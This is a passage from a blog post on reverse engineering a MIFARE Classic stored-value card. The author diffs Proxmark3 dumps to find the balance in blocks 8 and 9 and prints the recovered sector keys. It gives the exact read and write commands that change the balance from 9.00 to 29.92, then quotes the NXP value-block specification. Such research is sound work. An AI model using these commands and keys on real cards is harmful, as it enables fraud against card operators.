      data02: RAW=1D FB | INT_LE=     64285 | INT_BE=      7675 | NOT_LE=      1250 | NOT_BE=     57860 | BIN=1111101100011101 | BIN_NOT=0000010011100010 | NOT_RAW=E2 04
    !+08
      data01: RAW=84 03 | INT_LE=       900 | INT_BE=     33795 | NOT_LE=     64635 | NOT_BE=     31740 | BIN=0000001110000100 | BIN_NOT=1111110001111011 | NOT_RAW=7B FC
      data02: RAW=E2 04 | INT_LE=      1250 | INT_BE=     57860 | NOT_LE=     64285 | NOT_BE=      7675 | BIN=0000010011100010 | BIN_NOT=1111101100011101 | NOT_RAW=1D FB
```

Much cleaner. Each diff-ed unit is also visualised in different encoding (heavily based on [ImHex](https://imhex.werwolv.net/)) such as integer little/big-endian, bits, raw bytes and also their respective not-ed representation.

This is where knowing the visible credit value makes the whole thing much easier (almost [trivial](https://trivialityspace.github.io/)). In blocks `8` and `9`, the little-endian interpretation of the changed bytes directly matches the two balances: `9.00` and `12.50`.

```text
dump  ID*  sector  sector-block  offset  RAW    INT_LE  NOT_LE
----  ---  ------  ------------  ------  -----  ------  ------
0900  8    2       0             +00     84 03  <900>   64635
1250  8    2       0             +00     E2 04  <1250>  64285
0900  8    2       0             +04     7B FC  64635   <900>
1250  8    2       0             +04     1D FB  64285   <1250>
0900  8    2       0             +08     84 03  <900>   64635
1250  8    2       0             +08     E2 04  <1250>  64285
0900  9    2       1             +00     84 03  <900>   64635
1250  9    2       1             +00     E2 04  <1250>  64285
0900  9    2       1             +04     7B FC  64635   <900>
1250  9    2       1             +04     1D FB  64285   <1250>
0900  9    2       1             +08     84 03  <900>   64635
1250  9    2       1             +08     E2 04  <1250>  64285
```

\*`ID` is the global block number.

So it seems the credit value is written a few times, both as little-endian and as its bitwise-not counterpart. That kind of duplication is common in simple stored-value formats: one copy for the value, one inverted copy as a cheap consistency check, and sometimes another repeated copy for redundancy.

Block `6` also changes, but I am not sure what it represents. It is probably a timestamp, transaction counter, or some other metadata. To keep the experiment focused, I left block `6` alone and only changed the bytes in blocks `8` and `9` that clearly tracked the balance.

For the test value I used `B0 0B`, for mature and scientific reasons. Conveniently, it also maps to a `29.92` credit value when interpreted as a little-endian integer:

```sh
> ssdp conv b00b 2 --from RAW
BIN    : 1011000000001011
BIN_NOT: 0100111111110100
INT_BE : 45067
INT_LE : 2992
NOT_BE : 20468
NOT_LE : 62543
NOT_RAW: 4F F4
RAW    : B0 0B
```

Before writing anything, I wanted to read the target blocks back directly and keep the relevant sector keys in front of me. From the `autopwn` output, sector `2` uses trailer block `11`, with this key pair:

```sh
[+] -----+-----+--------------+---+--------------+----
[+]  Sec | Blk | key A        |res| key B        |res
[+] -----+-----+--------------+---+--------------+----
[+]  000 | 003 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  001 | 007 | A71A0C3102FD | N | B76198135BD9 | N
[+]  002 | 011 | A49F68AB4733 | N | B4E109EC9C52 | N
[+]  003 | 015 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  004 | 019 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  005 | 023 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  006 | 027 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  007 | 031 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  008 | 035 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  009 | 039 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  010 | 043 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  011 | 047 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  012 | 051 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  013 | 055 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  014 | 059 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  015 | 063 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+] -----+-----+--------------+---+--------------+----
[=] ( D:Dictionary / S:darkSide / U:User / R:Reused / N:Nested / H:Hardnested / C:statiCnested / A:keyA  )
```

Using key A for sector `2`, I can read blocks `8` and `9` directly and verify that they still contain the `9.00` balance representation:

```sh
[usb] pm3 --> hf mf rdbl --blk 8 -k A49F68AB4733

[=]   # | sector 02 / 0x02                                | ascii
[=] ----+-------------------------------------------------+-----------------
[=]   8 | 84 03 00 00 7B FC FF FF 84 03 00 00 09 F6 09 F6 | ....{........

[usb] pm3 --> hf mf rdbl --blk 9 -k A49F68AB4733

[=]   # | sector 02 / 0x02                                | ascii
[=] ----+-------------------------------------------------+-----------------
[=]   9 | 84 03 00 00 7B FC FF FF 84 03 00 00 09 F6 09 F6 | ....{........
```

The new block value is just the old block with `84 03` (`0900`) replaced by `B0 0B` (`29.92`) and `7B FC` replaced by `4F F4`, the inverted representation:

```python
>>> block = "84 03 00 00 7B FC FF FF 84 03 00 00 09 F6 09 F6"
>>> data = block.replace(" ", "")
>>> data = data.replace("8403", "B00B")
>>> data = data.replace("7BFC", "4FF4")
>>> data
'B00B00004FF4FFFFB00B000009F609F6'
```

For this sector, key B is accepted for the write. I wrote the same updated value to both blocks that appeared to hold the balance:

```sh
[usb] pm3 --> hf mf wrbl --blk 8 -k B4E109EC9C52 -b -d B00B00004FF4FFFFB00B000009F609F6
[=] Writing block no 8, key type:B - B4E109EC9C52
[=] data: B0 0B 00 00 4F F4 FF FF B0 0B 00 00 09 F6 09 F6
[+] Write ( ok )
[?] Hint: Try `hf mf rdbl` to verify

[usb] pm3 --> hf mf wrbl --blk 9 -k B4E109EC9C52 -b -d B00B00004FF4FFFFB00B000009F609F6
[=] Writing block no 9, key type:B - B4E109EC9C52
[=] data: B0 0B 00 00 4F F4 FF FF B0 0B 00 00 09 F6 09 F6
[+] Write ( ok )
[?] Hint: Try `hf mf rdbl` to verifyh
```

After writing, I dumped the card again and compared the modified dump against the previous `9.00` dump. The only intended differences should be in blocks `8` and `9`.

```
> ssdp diff --units 2 --format mf1k hf-mf-6C2FAC83-dump-xxxx.bin hf-mf-6C2FAC83-dump-0900.bin
Inputs:
  data01: hf-mf-6C2FAC83-dump-xxxx.bin
  data02: hf-mf-6C2FAC83-dump-0900.bin

Diff blocks:
  [BLOCK] ID=8 S=2 B=0
  [BLOCK] ID=9 S=2 B=1

[BLOCK] ID=8 S=2 B=0
  [units=2]
    data01: FULL=[B0 0B] | 00 00 | [4F F4] | FF FF | [B0 0B] | 00 00 | 09 F6 | 09 F6
    data02: FULL=[84 03] | 00 00 | [7B FC] | FF FF | [84 03] | 00 00 | 09 F6 | 09 F6
    !+00
      data01: RAW=B0 0B | INT_LE=      2992 | INT_BE=     45067 | NOT_LE=     62543 | NOT_BE=     20468 | BIN=0000101110110000 | BIN_NOT=1111010001001111 | NOT_RAW=4F F4
      data02: RAW=84 03 | INT_LE=       900 | INT_BE=     33795 | NOT_LE=     64635 | NOT_BE=     31740 | BIN=0000001110000100 | BIN_NOT=1111110001111011 | NOT_RAW=7B FC
    !+04
      data01: RAW=4F F4 | INT_LE=     62543 | INT_BE=     20468 | NOT_LE=      2992 | NOT_BE=     45067 | BIN=1111010001001111 | BIN_NOT=0000101110110000 | NOT_RAW=B0 0B
      data02: RAW=7B FC | INT_LE=     64635 | INT_BE=     31740 | NOT_LE=       900 | NOT_BE=     33795 | BIN=1111110001111011 | BIN_NOT=0000001110000100 | NOT_RAW=84 03
    !+08
      data01: RAW=B0 0B | INT_LE=      2992 | INT_BE=     45067 | NOT_LE=     62543 | NOT_BE=     20468 | BIN=0000101110110000 | BIN_NOT=1111010001001111 | NOT_RAW=4F F4
      data02: RAW=84 03 | INT_LE=       900 | INT_BE=     33795 | NOT_LE=     64635 | NOT_BE=     31740 | BIN=0000001110000100 | BIN_NOT=1111110001111011 | NOT_RAW=7B FC

[BLOCK] ID=9 S=2 B=1
  [units=2]
    data01: FULL=[B0 0B] | 00 00 | [4F F4] | FF FF | [B0 0B] | 00 00 | 09 F6 | 09 F6
    data02: FULL=[84 03] | 00 00 | [7B FC] | FF FF | [84 03] | 00 00 | 09 F6 | 09 F6
    !+00
      data01: RAW=B0 0B | INT_LE=      2992 | INT_BE=     45067 | NOT_LE=     62543 | NOT_BE=     20468 | BIN=0000101110110000 | BIN_NOT=1111010001001111 | NOT_RAW=4F F4
      data02: RAW=84 03 | INT_LE=       900 | INT_BE=     33795 | NOT_LE=     64635 | NOT_BE=     31740 | BIN=0000001110000100 | BIN_NOT=1111110001111011 | NOT_RAW=7B FC
    !+04
      data01: RAW=4F F4 | INT_LE=     62543 | INT_BE=     20468 | NOT_LE=      2992 | NOT_BE=     45067 | BIN=1111010001001111 | BIN_NOT=0000101110110000 | NOT_RAW=B0 0B
      data02: RAW=7B FC | INT_LE=     64635 | INT_BE=     31740 | NOT_LE=       900 | NOT_BE=     33795 | BIN=1111110001111011 | BIN_NOT=0000001110000100 | NOT_RAW=84 03
    !+08
      data01: RAW=B0 0B | INT_LE=      2992 | INT_BE=     45067 | NOT_LE=     62543 | NOT_BE=     20468 | BIN=0000101110110000 | BIN_NOT=1111010001001111 | NOT_RAW=4F F4
      data02: RAW=84 03 | INT_LE=       900 | INT_BE=     33795 | NOT_LE=     64635 | NOT_BE=     31740 | BIN=0000001110000100 | BIN_NOT=1111110001111011 | NOT_RAW=7B FC
```

{% include figure.html path="assets/img/blog/2025-10-12/2992.png" class="img-fluid centered" zoomable=true caption="Credit value after editing bytes in blocks 8 and 9: 29.92" %}

## Conclusion

That was enough to confirm the basic layout: the visible balance is stored in blocks `8` and `9`, repeated as a little-endian value and as its inverted counterpart. The other changed block is still suspicious, but it was not needed to make this specific value update work.

The fun part is how little magic there was once the dumps were side by side. Most of the work was not "breaking" anything, but getting the data into a shape where the pattern could be seen.

Of course, most of this reverse engineering could have been avoided by reading section `8.6.2.1` of the NXP specs first. That section describes MIFARE Classic value blocks, which are explicitly meant for electronic purse functions: `read`, `write`, `increment`, `decrement`, `restore`, and `transfer`. In other words, the pattern that looked like a nice recovered structure was already documented in the datasheet.

<details markdown="1">
<summary>Section 8.6.2.1: Value blocks</summary>

In this excerpt I use `~value` and `~adr` for the bitwise-not copies stored in the block. The value itself is signed, so negative values are represented in standard two's-complement form.

Value blocks allow performing electronic purse functions (valid commands are: read,
write, increment, decrement, restore, transfer). Value blocks have a fixed data format
which permits error detection and correction and a backup management.

A value block can only be generated through a write operation in value block format:

- Value: Signifies a signed 4-byte value. The lowest significant byte of a value is stored
in the lowest address byte. Negative values are stored in standard 2's complement
format. For reasons of data integrity and security, a value is stored three times, twice
non-inverted and once inverted.

- Adr: Signifies a 1-byte address, which can be used to save the storage address of a
block, when implementing a powerful backup management. The address byte is stored four
times, twice inverted and non-inverted. During increment, decrement, restore and transfer
operations the address remains unchanged. It can only be altered via a write command.

Figure 8. Value blocks

```text
+-------------+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
| Byte Number | 0  | 1  | 2  | 3  | 4  | 5  | 6  | 7  | 8  | 9  | 10 | 11 | 12 | 13 | 14 | 15 |
+-------------+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
| Description | value             | ~value            | value             |adr |~adr|adr |~adr|
+-------------+-------------------+-------------------+-------------------+----+----+----+----+
```

An example of a valid value block format for the decimal value `1234567d` and the block
address `17d` is shown in Table 4. First, the decimal value has to be converted to the
hexadecimal representation of `0012D687h`. The LSByte of the hexadecimal value is stored
in Byte 0, the MSByte in Byte 3. The `~value` hexadecimal representation is `FFED2978h`,
where the LSByte is stored in Byte 4 and the MSByte in Byte 7.

The hexadecimal value of the address in the example is `11h`; `~adr` is `EEh`.

Table 4. Value block format example

```text
+-------------+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
| Byte Number | 0  | 1  | 2  | 3  | 4  | 5  | 6  | 7  | 8  | 9  | 10 | 11 | 12 | 13 | 14 | 15 |
+-------------+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
| Description | value             | ~value            | value             |adr |~adr|adr |~adr|
+-------------+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
| Values hex  | 87 | D6 | 12 | 00 | 78 | 29 | ED | FF | 87 | D6 | 12 | 00 | 11 | EE | 11 | EE |
+-------------+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
```

</details>
